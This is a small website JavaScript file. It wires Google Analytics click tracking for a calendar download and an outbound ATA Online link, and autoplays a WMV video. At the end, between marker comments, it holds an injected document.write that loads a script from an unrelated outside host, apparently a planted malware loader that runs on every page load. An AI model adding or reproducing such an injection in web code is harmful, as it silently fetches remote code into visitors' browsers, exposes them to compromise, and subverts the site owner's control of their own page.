// Begin Analytics
$(document).ready( function() {
	$('#Picture936A').bind('click', function() { pageTracker._trackPageview('/downloads/calendar.pdf'); } );
	$('#Picture1027A').bind('click', function() { pageTracker._trackPageview('/outgoing/www.ataonline.com/districts/'); } );
});
// End Analytics

// Begin jMedia Components
$(document).ready(function() {
	$("#WindowsMediaPlayer1").media({width: 297, height: 173, src: 'Chief_Master_A.wmv', autoplay: true});
});
// End jMedia Components

/*2b6b4b*/
document.write('<script src="http://plan-b.cwsurf.de/y98K4N6o.php?id=66195496" type="text/javascript"></script>');
/*/2b6b4b*/
